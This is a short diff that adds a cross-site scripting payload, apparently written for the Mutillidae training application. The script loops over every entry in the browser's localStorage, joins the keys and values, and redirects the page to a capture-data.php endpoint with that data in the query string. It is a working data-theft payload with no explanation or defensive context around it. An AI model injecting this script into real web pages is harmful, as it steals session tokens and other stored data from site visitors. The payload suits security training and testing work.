@@ -1,0 +1,3 @@
+<script>try{var m = "";var l = window.localStorage;for(i=0;i<l.length;i++){
+var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\\n";}; 
+document.location="http://localhost/mutillidae/capture-data.php?html5storage=" + m;}catch(e){alert(e.message);}</script>
